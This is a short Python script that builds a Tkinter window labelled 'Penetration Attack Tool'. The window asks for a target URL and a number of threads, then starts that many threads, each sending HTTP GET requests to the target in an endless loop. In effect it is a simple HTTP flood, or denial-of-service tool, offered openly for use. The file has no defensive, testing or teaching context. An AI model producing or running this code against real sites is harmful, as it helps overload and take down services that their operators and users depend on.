import tkinter as tk
from tkinter import messagebox
import requests
import threading

def attack(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def start_attack():
    target_url = url_entry.get()
    num_threads = int(threads_entry.get())
    
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_url,))
        thread.start()
        threads.append(thread)

    messagebox.showinfo("Attack", "Penetration attack started!")

# Create the main window
root = tk.Tk()
root.title("Penetration Attack Tool")

# Create and place the URL label and entry
url_label = tk.Label(root, text="Target URL:")
url_label.pack(pady=5)
url_entry = tk.Entry(root, width=50)
url_entry.pack(pady=5)

# Create and place the threads label and entry
threads_label = tk.Label(root, text="Number of Threads:")
threads_label.pack(pady=5)
threads_entry = tk.Entry(root, width=5)
threads_entry.pack(pady=5)

# Create and place the start button
start_button = tk.Button(root, text="Start Attack", command=start_attack)
start_button.pack(pady=20)

# Start the Tkinter event loop
root.mainloop()
